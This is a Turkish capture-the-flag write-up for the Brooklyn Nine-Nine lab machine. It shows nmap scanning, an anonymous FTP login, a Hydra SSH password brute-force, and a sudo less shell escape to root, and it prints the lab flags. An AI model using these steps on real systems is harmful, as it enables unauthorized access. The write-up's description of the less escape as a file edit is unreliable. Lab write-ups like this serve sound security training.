# Brooklyn Nine-Nine CTF Çözümü

## 1.Adım Ping Taraması
Öncelikle hedef makinenin erişilebilir olup olmadığını kontrol etmek için bir ping taraması yaptım:

```bash
ping Machine_IP
```
## 2.Adım Nmap Taraması
Ardından, açık portları ve servisleri belirlemek için bir Nmap taraması gerçekleştirdim:
```bash
nmap --top-ports 20 -sV Machine_IP
```
Nmap tarama sonuçları:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 15:20 EDT
Nmap scan report for 10.10.162.46
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
```
## 3.Adım FTP Anonymous Girişi
FTP servisinde anonim giriş açığı olup olmadığını test ettim:
```bash
ftp Machine_IP
Name (Machine_IP:kali): anonymous
Password: [boş bırakın]
```
Başarıyla giriş yapıldı. Dosyaları listeledim ve note_to_jake.txt dosyasını indirdim:
```bash
ftp> ls
ftp> get note_to_jake.txt
```
## 4.Adım SSH Giriş Bruteforce
note_to_jake.txt dosyasından amy, jake ve holt isimleri ile bir usernames.txt dosyası oluşturdum. Ardından Hydra kullanarak SSH girişini brute-force ile denedim:
```bash
hydra -L usernames.txt -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100.txt ssh://Machine_IP -t 20
```
Geçerli kimlik bilgilerini buldum:
```bash
Host: Machine_IP
Kullanıcı Adı: jake
Şifre: 987654321
```
## 5.Adım SSH Bağlantısı
Bulduğum kimlik bilgilerini kullanarak SSH üzerinden makineye bağlandım:
```bash
ssh jake@Machine_IP
```
## 6.Adım Dizin Keşfi
jake, amy ve holt dizinlerini keşfettim:
```bash
jake@brookly_nine_nine:~$ cd ..
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd amy
jake@brookly_nine_nine:/home/amy$ ls
jake@brookly_nine_nine:/home/amy$ cd ..
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
```
Kullanıcı bayrağını elde ettim:
```bash
ee11cbb19052e40b07aac0ca060c23ee
```
## 7.Adım Yetki Yükseltme
Sudo yetkilerini kontrol ettim:
```bash
sudo -l
```
Şifresiz less komutunu sudo ile çalıştırma iznim vardı:
```bash
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
Bunu root yetkisi kazanmak için /etc/profile dosyasını düzenleyerek kullandım:
```bash
sudo less /etc/profile
```
Dosyanın en altına şunu ekledim:
```bash
!/bin/bash
```
## 8.Adım  Root Yetkisi ve Bayrak Elde Etme
Root yetkisini kazandıktan sonra root bayrağını elde ettim:
```bash
cat /root/root.txt
```
Root bayrağı:
```bash
63a9f0ea7bb98050796b649e85481845
```
